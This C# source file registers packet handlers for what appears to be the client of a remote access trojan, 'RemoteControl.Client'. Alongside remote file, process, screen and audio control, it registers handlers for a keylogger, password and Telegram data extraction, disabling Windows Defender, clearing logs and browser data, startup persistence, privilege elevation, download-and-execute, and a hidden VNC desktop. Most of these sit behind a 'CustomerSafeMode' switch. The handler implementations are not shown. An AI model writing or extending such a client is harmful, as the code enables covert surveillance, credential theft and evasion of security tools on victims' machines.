using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    partial class Program
    {
        static void InitHandlers()
        {
            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
            RequestCaptureAudioHandler captureAudioHandler = new RequestCaptureAudioHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            RequestGetProcessesHandler getProcessesHandler = new RequestGetProcessesHandler();
            handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_SUSPEND_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_RESUME_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_SET_PROCESS_PRIORITY_REQUEST, getProcessesHandler);
            if (!CustomerSafeMode)
            {
                handlers.Add(ePacketType.PACKET_AUTORUN_REQUEST, new RequestAutoRunHandler());
            }
            RequestGetDrivesHandler getDrivesHandler = new RequestGetDrivesHandler();
            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, getDrivesHandler);
            handlers.Add(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, getDrivesHandler);
            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
            RequestOpeFileOrDirHandler opeFileOrDirHandler = new RequestOpeFileOrDirHandler();
            handlers.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_RENAME_FILE_REQUEST, opeFileOrDirHandler);
            RequestPowerHandler powerHandler = new RequestPowerHandler();
            handlers.Add(ePacketType.PACKET_SHUTDOWN_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_REBOOT_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_SLEEP_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_HIBERNATE_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_LOCK_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_OPEN_URL_REQUEST, new RequestOpenUrlHandler());
            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
            RequestLockMouseHandler lockMouseHandler = new RequestLockMouseHandler();
            handlers.Add(ePacketType.PACKET_LOCK_MOUSE_REQUEST, lockMouseHandler);
            handlers.Add(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, lockMouseHandler);
            RequestBlackScreenHandler blackScreenHandler = new RequestBlackScreenHandler();
            handlers.Add(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, blackScreenHandler);
            handlers.Add(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, blackScreenHandler);
            handlers.Add(ePacketType.PACKET_MESSAGEBOX_REQUEST, new RequestMsgBoxHandler());
            RequestOpeCDHandler opeCDHandler = new RequestOpeCDHandler();
            handlers.Add(ePacketType.PACKET_OPEN_CD_REQUEST, opeCDHandler);
            handlers.Add(ePacketType.PACKET_CLOSE_CD_REQUEST, opeCDHandler);
            RequestPlayMusicHandler playMusicHandler = new RequestPlayMusicHandler();
            handlers.Add(ePacketType.PACKET_PLAY_MUSIC_REQUEST, playMusicHandler);
            handlers.Add(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, playMusicHandler);
            handlers.Add(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, new RequestDownloadWebFileHandler());
            handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
            handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
            handlers.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, new RequestOpenFileHandler());
            RequestCaptureVideoHandler capVideoHandler = new RequestCaptureVideoHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST, capVideoHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST, capVideoHandler);
            RequestUploadHandler uploadHandler = new RequestUploadHandler();
            handlers.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, uploadHandler);
            handlers.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, uploadHandler);
            handlers.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, uploadHandler);
            if (!CustomerSafeMode)
            {
                RequestExecCodeHandler execCodeHandler = new RequestExecCodeHandler();
                execCodeHandler.OnFireQuit = OnFireQuit;
                handlers.Add(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, execCodeHandler);
                handlers.Add(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, execCodeHandler);
            }
            handlers.Add(ePacketType.PACKET_QUIT_APP_REQUEST, new RequestQuitAppHandler() { OnFireQuit = OnFireQuit });
            handlers.Add(ePacketType.PACKET_RESTART_APP_REQUEST, new RequestRestartAppHandler() { OnFireQuit = OnFireQuit });

            // 新增功能 Handlers
            handlers.Add(ePacketType.PACKET_RUN_FILE_REQUEST, new RequestRunFileHandler());
            handlers.Add(ePacketType.PACKET_COMPRESS_FILE_REQUEST, new RequestCompressFileHandler());
            handlers.Add(ePacketType.PACKET_DECOMPRESS_FILE_REQUEST, new RequestDecompressFileHandler());
            handlers.Add(ePacketType.PACKET_RESTART_EXPLORER_REQUEST, new RequestRestartExplorerHandler());
            handlers.Add(ePacketType.PACKET_TOGGLE_PROXY_REQUEST, new RequestToggleProxyHandler());
            handlers.Add(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, new RequestServiceManagerHandler());
            handlers.Add(ePacketType.PACKET_REMOTE_CHAT_REQUEST, new RequestRemoteChatHandler());
            handlers.Add(ePacketType.PACKET_FIND_WINDOW_REQUEST, new RequestFindWindowHandler());
            handlers.Add(ePacketType.PACKET_CHANGE_CONFIG_REQUEST, new RequestChangeConfigHandler());
            handlers.Add(ePacketType.PACKET_CHANGE_RESOLUTION_REQUEST, new RequestChangeResolutionHandler());
            handlers.Add(ePacketType.PACKET_UNINSTALL_REQUEST, new RequestUninstallHandler());
            handlers.Add(ePacketType.PACKET_LOGOFF_REQUEST, powerHandler);

            if (!CustomerSafeMode)
            {
                handlers.Add(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLogHandler());
                handlers.Add(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserDataHandler());
                handlers.Add(ePacketType.PACKET_WRITE_STARTUP_REQUEST, new RequestWriteStartupHandler());
                handlers.Add(ePacketType.PACKET_ELEVATE_PRIVILEGE_REQUEST, new RequestElevatePrivilegeHandler());
                handlers.Add(ePacketType.PACKET_PROXY_MAPPING_REQUEST, new RequestProxyMappingHandler());
                handlers.Add(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, new RequestDownloadExecHandler());
                RequestKeyloggerHandler keyloggerHandler = new RequestKeyloggerHandler();
                handlers.Add(ePacketType.PACKET_KEYLOGGER_START_REQUEST, keyloggerHandler);
                handlers.Add(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, keyloggerHandler);
                handlers.Add(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtractHandler());
                handlers.Add(ePacketType.PACKET_PASSWORD_EXTRACT_REQUEST, new RequestPasswordExtractHandler());
                handlers.Add(ePacketType.PACKET_DISABLE_DEFENDER_REQUEST, new RequestDisableDefenderHandler());
                handlers.Add(ePacketType.PACKET_ARCHIVE_ALL_REQUEST, new RequestArchiveAllHandler());
            }

            // 新增通用功能 Handlers（正常）
            handlers.Add(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_REQUEST, new RequestGetNetworkConnectionsHandler());
            handlers.Add(ePacketType.PACKET_GET_HOST_INFO_REQUEST, new RequestGetHostInfoHandler());
            RequestClipboardHandler clipboardHandler = new RequestClipboardHandler();
            handlers.Add(ePacketType.PACKET_CLIPBOARD_GET_REQUEST, clipboardHandler);
            handlers.Add(ePacketType.PACKET_CLIPBOARD_SET_REQUEST, clipboardHandler);
            handlers.Add(ePacketType.PACKET_GET_WINDOWS_REQUEST, new RequestGetWindowsHandler());

            // HVNC 隐形桌面
            RequestHVNCHandler hvncHandler = new RequestHVNCHandler();
            handlers.Add(ePacketType.PACKET_HVNC_START_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST, hvncHandler);
        }
    }
}
